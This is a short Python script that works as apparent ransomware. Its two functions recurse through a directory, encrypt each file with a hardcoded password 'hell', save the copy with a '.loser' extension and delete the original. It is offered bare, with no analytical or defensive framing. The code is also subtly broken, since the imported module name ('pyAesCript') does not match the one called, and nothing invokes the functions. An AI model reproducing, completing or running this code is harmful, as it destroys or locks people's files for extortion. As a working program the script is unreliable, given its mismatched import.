import os,sys
def dos(file):
    import pyAesCript
    password = 'hell'
    bufferSize = 512*1024
    pyAesCrypt.encryptFile(str(file),str(file)+'.loser',password,bufferSize)
    os.remove(file)
def direct(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir,name)
        if os.path.isfile(path): dos(path)
        else: direct(path)
